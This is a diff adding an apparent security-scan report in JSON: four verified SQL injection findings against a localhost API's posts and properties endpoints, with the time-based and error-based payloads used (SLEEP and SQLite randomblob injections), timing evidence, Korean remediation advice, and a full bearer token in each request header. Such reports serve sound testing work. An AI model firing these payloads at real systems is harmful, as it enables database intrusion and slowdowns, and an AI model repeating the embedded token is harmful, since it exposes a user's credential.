@@ -1,0 +1,240 @@
+[
+  {
+    "method": "GET",
+    "url": "http://localhost:8080/api/v1/posts?type=REVIEW&status=%27&page=0&size=20",
+    "param": "status",
+    "risk": "HIGH",
+    "plugin_id": "40018",
+    "plugin_name": "SQL 인젝션",
+    "injection_type": "SQL",
+    "verification_status": "VERIFIED",
+    "verification_reason": "Verified by error_based, time_based.",
+    "cross_validated": true,
+    "has_zap": true,
+    "zap_payload": "'",
+    "zap_time_delay_ms": 0,
+    "custom_verified": true,
+    "custom_payload": "' OR SLEEP(3)-- -",
+    "custom_time_delay_sec": 10.0,
+    "evidence": "Verified by error_based, time_based.",
+    "verification_methods": {
+      "baseline": {
+        "status": "VERIFIED",
+        "evidence": "Baseline request rebuilt via query.",
+        "status_code": "200",
+        "elapsed_sec": 0.067
+      },
+      "error_based": {
+        "status": "VERIFIED",
+        "evidence": "Error signal changed at query.",
+        "status_code": "500",
+        "matched_patterns": [],
+        "payload": "'"
+      },
+      "boolean_based": {
+        "status": "FALSE_POSITIVE",
+        "evidence": "No stable boolean response divergence.",
+        "tried_pairs": 4,
+        "best_similarity_delta": 0.0
+      },
+      "time_based": {
+        "status": "VERIFIED",
+        "evidence": "Time delta exceeded threshold at query.",
+        "baseline_sec": 0.067,
+        "delayed_sec": 10.0,
+        "diff_sec": 9.933,
+        "status_code": "TIMEOUT",
+        "payload": "' OR SLEEP(3)-- -"
+      }
+    },
+    "description": "SQL 인젝션이 가능할 수 있습니다.",
+    "solution": "클라이언트 측 유효성 검사(validation)가 갖춰져 있더라도, 클라이언트 측 입력을 신뢰하지 마십시오.\n일반적으로, 서버 측에서 모든 데이터의 유형을 확인하십시오.\n애플리케이션이 JDBC를 사용하는 경우, PreparedStatement 또는 CallableStatement를 사용하고 파라미터를 '?'로 전달하십시오.\n애플리케이션이 ASP를 사용하는 경우, 강력한 유형 검사 및 매개 변수화된 쿼리를 사용하는 ADO Command Object를 사용하십시오.\n데이터베이스 저장 프로시저를 사용할 수 있다면 사용하십시오.\n저장 프로시저 내에서 쿼리에 문자열을 연결하거나, 'exec', 'exec immediate' 또는 이와 동등한 기능을 사용하지 마십시오!\n단순 문자열 연결을 사용하여 동적 SQL 쿼리를 생성하지 마십시오.\n클라이언트로부터 수신된 모든 데이터를 이스케이프 처리하십시오.\n사용자 입력에 허용되는 문자의 '허용 목록' 또는 허용되지 않는 문자의 '거부 목록'을 적용하십시오.\n가능한 가장 낮은 권한을 가진 데이터베이스 사용자를 사용하여 최소 권한의 원칙을 적용하십시오.\n특히 'sa' 또는 'db-owner' 데이터베이스 사용자의 사용을 피하십시오. 이는 SQL 인젝션을 제거하지는 않지만, 그 영향을 최소화합니다.\n애플리케이션에 필요한 최소한의 데이터베이스 접근 권한을 부여하십시오.",
+    "raw_request_body": "",
+    "raw_request_url": "http://localhost:8080/api/v1/posts?type=REVIEW&status=%27&page=0&size=20",
+    "raw_request_headers": {
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+      "pragma": "no-cache",
+      "cache-control": "no-cache",
+      "accept": "*/*",
+      "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJqaW5hQHRyYXZlbC5jb20iLCJyb2xlIjoiUk9MRV9VU0VSIiwiaWF0IjoxNzgyODcwMzcxLCJleHAiOjE3ODI4NzIxNzF9.6Cmt2qT9HRyZzfIrgj1A4P_6n9mcOueErvqrv6ny1XvLALD-9AGP5B9GQIsxUAfTBhBrIled7mWqCFmqckwU7g"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "http://localhost:8080/api/v1/posts?type=REVIEW&status=ACTIVE&page=0&size=20",
+    "param": "status",
+    "risk": "HIGH",
+    "plugin_id": "40019",
+    "plugin_name": "SQL 인젝션 - MsSQL (시간 기반)",
+    "injection_type": "SQL",
+    "verification_status": "VERIFIED",
+    "verification_reason": "Verified by error_based, time_based.",
+    "cross_validated": true,
+    "has_zap": true,
+    "zap_payload": "ACTIVE' or 0 in (select sleep(15) ) -- ",
+    "zap_time_delay_ms": 0,
+    "custom_verified": true,
+    "custom_payload": "' OR SLEEP(3)-- -",
+    "custom_time_delay_sec": 10.0,
+    "evidence": "Verified by error_based, time_based.",
+    "verification_methods": {
+      "baseline": {
+        "status": "VERIFIED",
+        "evidence": "Baseline request rebuilt via query.",
+        "status_code": "200",
+        "elapsed_sec": 0.052
+      },
+      "error_based": {
+        "status": "VERIFIED",
+        "evidence": "Error signal changed at query.",
+        "status_code": "500",
+        "matched_patterns": [],
+        "payload": "'"
+      },
+      "boolean_based": {
+        "status": "FALSE_POSITIVE",
+        "evidence": "No stable boolean response divergence.",
+        "tried_pairs": 4,
+        "best_similarity_delta": 0.0
+      },
+      "time_based": {
+        "status": "VERIFIED",
+        "evidence": "Time delta exceeded threshold at query.",
+        "baseline_sec": 0.052,
+        "delayed_sec": 10.0,
+        "diff_sec": 9.948,
+        "status_code": "TIMEOUT",
+        "payload": "' OR SLEEP(3)-- -"
+      }
+    },
+    "description": "SQL 인젝션이 가능할 수 있습니다.",
+    "solution": "클라이언트 측 유효성 검사(validation)가 갖춰져 있더라도, 클라이언트 측 입력을 신뢰하지 마십시오.\n일반적으로, 서버 측에서 모든 데이터의 유형을 확인하십시오.\n애플리케이션이 JDBC를 사용하는 경우, PreparedStatement 또는 CallableStatement를 사용하고 파라미터를 '?'로 전달하십시오.\n애플리케이션이 ASP를 사용하는 경우, 강력한 유형 검사 및 매개 변수화된 쿼리를 사용하는 ADO Command Object를 사용하십시오.\n데이터베이스 저장 프로시저를 사용할 수 있다면 사용하십시오.\n저장 프로시저 내에서 쿼리에 문자열을 연결하거나, 'exec', 'exec immediate' 또는 이와 동등한 기능을 사용하지 마십시오!\n단순 문자열 연결을 사용하여 동적 SQL 쿼리를 생성하지 마십시오.\n클라이언트로부터 수신된 모든 데이터를 이스케이프 처리하십시오.\n사용자 입력에 허용되는 문자의 '허용 목록' 또는 허용되지 않는 문자의 '거부 목록'을 적용하십시오.\n가능한 가장 낮은 권한을 가진 데이터베이스 사용자를 사용하여 최소 권한의 원칙을 적용하십시오.\n특히 'sa' 또는 'db-owner' 데이터베이스 사용자의 사용을 피하십시오. 이는 SQL 인젝션을 제거하지는 않지만, 그 영향을 최소화합니다.\n애플리케이션에 필요한 최소한의 데이터베이스 접근 권한을 부여하십시오.",
+    "raw_request_body": "",
+    "raw_request_url": "http://localhost:8080/api/v1/posts?type=REVIEW&status=ACTIVE%27+or+0+in+%28select+sleep%2815%29+%29+--+&page=0&size=20",
+    "raw_request_headers": {
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+      "pragma": "no-cache",
+      "cache-control": "no-cache",
+      "accept": "*/*",
+      "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJqaW5hQHRyYXZlbC5jb20iLCJyb2xlIjoiUk9MRV9VU0VSIiwiaWF0IjoxNzgyODcwMzcxLCJleHAiOjE3ODI4NzIxNzF9.6Cmt2qT9HRyZzfIrgj1A4P_6n9mcOueErvqrv6ny1XvLALD-9AGP5B9GQIsxUAfTBhBrIled7mWqCFmqckwU7g"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "http://localhost:8080/api/v1/properties?swLat=1.2&swLng=1.2&neLat=1.2&neLng=1.2",
+    "param": "swLng",
+    "risk": "HIGH",
+    "plugin_id": "40024",
+    "plugin_name": "SQL 인젝션 - SQLite (시간 기반)",
+    "injection_type": "SQL",
+    "verification_status": "VERIFIED",
+    "verification_reason": "Verified by error_based.",
+    "cross_validated": true,
+    "has_zap": true,
+    "zap_payload": "' | case randomblob(10000000) when not null then \"\" else \"\" end | '",
+    "zap_time_delay_ms": 0,
+    "custom_verified": true,
+    "custom_payload": "'",
+    "custom_time_delay_sec": 0.0,
+    "evidence": "Verified by error_based.",
+    "verification_methods": {
+      "baseline": {
+        "status": "VERIFIED",
+        "evidence": "Baseline request rebuilt via query.",
+        "status_code": "200",
+        "elapsed_sec": 0.006
+      },
+      "error_based": {
+        "status": "VERIFIED",
+        "evidence": "Error signal changed at query.",
+        "status_code": "500",
+        "matched_patterns": [],
+        "payload": "'"
+      },
+      "boolean_based": {
+        "status": "FALSE_POSITIVE",
+        "evidence": "No stable boolean response divergence.",
+        "tried_pairs": 4,
+        "best_similarity_delta": 0.0
+      },
+      "time_based": {
+        "status": "FALSE_POSITIVE",
+        "evidence": "No meaningful time delta.",
+        "baseline_sec": 0.006,
+        "max_delay_sec": 0.01,
+        "tried_payloads": 10
+      }
+    },
+    "description": "SQL 인젝션이 가능할 수 있습니다.",
+    "solution": "클라이언트 측 유효성 검사(validation)가 갖춰져 있더라도, 클라이언트 측 입력을 신뢰하지 마십시오.\n일반적으로, 서버 측에서 모든 데이터의 유형을 확인하십시오.\n애플리케이션이 JDBC를 사용하는 경우, PreparedStatement 또는 CallableStatement를 사용하고 파라미터를 '?'로 전달하십시오.\n애플리케이션이 ASP를 사용하는 경우, 강력한 유형 검사 및 매개 변수화된 쿼리를 사용하는 ADO Command Object를 사용하십시오.\n데이터베이스 저장 프로시저를 사용할 수 있다면 사용하십시오.\n저장 프로시저 내에서 쿼리에 문자열을 연결하거나, 'exec', 'exec immediate' 또는 이와 동등한 기능을 사용하지 마십시오!\n단순 문자열 연결을 사용하여 동적 SQL 쿼리를 생성하지 마십시오.\n클라이언트로부터 수신된 모든 데이터를 이스케이프 처리하십시오.\n사용자 입력에 허용되는 문자의 '허용 목록' 또는 허용되지 않는 문자의 '거부 목록'을 적용하십시오.\n가능한 가장 낮은 권한을 가진 데이터베이스 사용자를 사용하여 최소 권한의 원칙을 적용하십시오.\n특히 'sa' 또는 'db-owner' 데이터베이스 사용자의 사용을 피하십시오. 이는 SQL 인젝션을 제거하지는 않지만, 그 영향을 최소화합니다.\n애플리케이션에 필요한 최소한의 데이터베이스 접근 권한을 부여하십시오.",
+    "raw_request_body": "",
+    "raw_request_url": "http://localhost:8080/api/v1/properties?swLat=1.2&swLng=%27+%7C+case+randomblob%2810000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%27&neLat=1.2&neLng=1.2",
+    "raw_request_headers": {
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+      "pragma": "no-cache",
+      "cache-control": "no-cache",
+      "accept": "*/*",
+      "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJqaW5hQHRyYXZlbC5jb20iLCJyb2xlIjoiUk9MRV9VU0VSIiwiaWF0IjoxNzgyODcwMzcxLCJleHAiOjE3ODI4NzIxNzF9.6Cmt2qT9HRyZzfIrgj1A4P_6n9mcOueErvqrv6ny1XvLALD-9AGP5B9GQIsxUAfTBhBrIled7mWqCFmqckwU7g"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "http://localhost:8080/api/v1/posts?type=REVIEW&status=ACTIVE&page=0&size=20",
+    "param": "status",
+    "risk": "HIGH",
+    "plugin_id": "40024",
+    "plugin_name": "SQL 인젝션 - SQLite (시간 기반)",
+    "injection_type": "SQL",
+    "verification_status": "VERIFIED",
+    "verification_reason": "Verified by error_based, time_based.",
+    "cross_validated": true,
+    "has_zap": true,
+    "zap_payload": "ACTIVE' | case randomblob(100000000) when not null then \"\" else \"\" end | '",
+    "zap_time_delay_ms": 0,
+    "custom_verified": true,
+    "custom_payload": "' OR SLEEP(3)-- -",
+    "custom_time_delay_sec": 10.0,
+    "evidence": "Verified by error_based, time_based.",
+    "verification_methods": {
+      "baseline": {
+        "status": "VERIFIED",
+        "evidence": "Baseline request rebuilt via query.",
+        "status_code": "200",
+        "elapsed_sec": 0.005
+      },
+      "error_based": {
+        "status": "VERIFIED",
+        "evidence": "Error signal changed at query.",
+        "status_code": "500",
+        "matched_patterns": [],
+        "payload": "'"
+      },
+      "boolean_based": {
+        "status": "FALSE_POSITIVE",
+        "evidence": "No stable boolean response divergence.",
+        "tried_pairs": 4,
+        "best_similarity_delta": 0.0
+      },
+      "time_based": {
+        "status": "VERIFIED",
+        "evidence": "Time delta exceeded threshold at query.",
+        "baseline_sec": 0.005,
+        "delayed_sec": 10.0,
+        "diff_sec": 9.995,
+        "status_code": "TIMEOUT",
+        "payload": "' OR SLEEP(3)-- -"
+      }
+    },
+    "description": "SQL 인젝션이 가능할 수 있습니다.",
+    "solution": "클라이언트 측 유효성 검사(validation)가 갖춰져 있더라도, 클라이언트 측 입력을 신뢰하지 마십시오.\n일반적으로, 서버 측에서 모든 데이터의 유형을 확인하십시오.\n애플리케이션이 JDBC를 사용하는 경우, PreparedStatement 또는 CallableStatement를 사용하고 파라미터를 '?'로 전달하십시오.\n애플리케이션이 ASP를 사용하는 경우, 강력한 유형 검사 및 매개 변수화된 쿼리를 사용하는 ADO Command Object를 사용하십시오.\n데이터베이스 저장 프로시저를 사용할 수 있다면 사용하십시오.\n저장 프로시저 내에서 쿼리에 문자열을 연결하거나, 'exec', 'exec immediate' 또는 이와 동등한 기능을 사용하지 마십시오!\n단순 문자열 연결을 사용하여 동적 SQL 쿼리를 생성하지 마십시오.\n클라이언트로부터 수신된 모든 데이터를 이스케이프 처리하십시오.\n사용자 입력에 허용되는 문자의 '허용 목록' 또는 허용되지 않는 문자의 '거부 목록'을 적용하십시오.\n가능한 가장 낮은 권한을 가진 데이터베이스 사용자를 사용하여 최소 권한의 원칙을 적용하십시오.\n특히 'sa' 또는 'db-owner' 데이터베이스 사용자의 사용을 피하십시오. 이는 SQL 인젝션을 제거하지는 않지만, 그 영향을 최소화합니다.\n애플리케이션에 필요한 최소한의 데이터베이스 접근 권한을 부여하십시오.",
+    "raw_request_body": "",
+    "raw_request_url": "http://localhost:8080/api/v1/posts?type=REVIEW&status=ACTIVE%27+%7C+case+randomblob%28100000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%27&page=0&size=20",
+    "raw_request_headers": {
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+      "pragma": "no-cache",
+      "cache-control": "no-cache",
+      "accept": "*/*",
+      "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJqaW5hQHRyYXZlbC5jb20iLCJyb2xlIjoiUk9MRV9VU0VSIiwiaWF0IjoxNzgyODcwMzcxLCJleHAiOjE3ODI4NzIxNzF9.6Cmt2qT9HRyZzfIrgj1A4P_6n9mcOueErvqrv6ny1XvLALD-9AGP5B9GQIsxUAfTBhBrIled7mWqCFmqckwU7g"
+    }
+  }
+]
